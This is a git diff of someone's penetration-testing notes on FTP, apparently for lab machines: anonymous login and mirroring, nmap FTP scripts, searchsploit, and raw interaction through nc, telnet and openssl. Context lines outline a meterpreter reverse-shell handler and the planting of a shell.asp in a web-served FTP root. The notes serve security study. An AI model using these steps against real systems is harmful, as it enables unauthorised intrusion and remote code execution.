@@ -19,10 +19,9 @@ ftp 10.129.228.195
 ```
 #### Download ALL Files at once
 ```shell
-wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
+wget -m --no-passive ftp://anonymous:anonymous@10.129.202.5
 tree . #shows the directory structure if we do it in that created folder
 ```
-
 #### Upload a file
 ```shell 
 touch testupload.txt # on attacker
@@ -36,12 +35,10 @@ get #download file
 cd #change directory
 put /home/test/test.txt #upload file
 ```
-### FTP Enumeration
 
-#### Nmap
-```sh
-nmap -sV -sC 192.254.1.1 -p21 #default scan find already anonymous login is allowed and read or writeable
-```
+
+### FTP Enumeration
+In ftp shell
 ```shell
 status #show some infos
 debug #show debug info
@@ -49,8 +46,31 @@ trace #show if tracing is on
 ls # list directories
 ```
 
-
-#### searchsploit 
+### Nmap and FTP
+```sh
+nmap -sV -sC 192.254.1.1 -p21 #default scan find already anonymous login is allowed and read or writeable
+sudo nmap -sV -p21 -sC -A 10.129.202.5 #aggresive scan with script and version detection
+```
+Find all FTP related scripts in nmap
+```shell
+find / -type f -name ftp* 2>/dev/null | grep scripts
+```
+Nmap ftp scripts
+```
+/usr/share/nmap/scripts/ftp-syst.nse
+/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
+/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-bounce.nse
+/usr/share/nmap/scripts/ftp-libopie.nse
+/usr/share/nmap/scripts/ftp-anon.nse
+/usr/share/nmap/scripts/ftp-brute.nse
+```
+Nmap cript trace for more informations
+```shell
+sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace #see what nmap exactly send and get in the scripts
+```
+### searchsploit 
 femitter is a ftp server type name
 ```sh
 searchsploit femitter #search for exploits
@@ -90,6 +110,13 @@ msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/revers
 ```
 4. Put  the shell.asp in webroot of ftp and try to open in browser.
 5. Than open it in browser to execute the shell.
+
+## Ways to interact with ftp beside ftp client
+```shell
+nc -nv 10.129.14.136 21
+telnet 10.129.14.136 21
+openssl s_client -connect 10.129.14.136:21 -starttls ftp # ftp over open ssl
+```
 
 ## vsFTP
 is a very often used FTP server here is the configuration parameters descriped
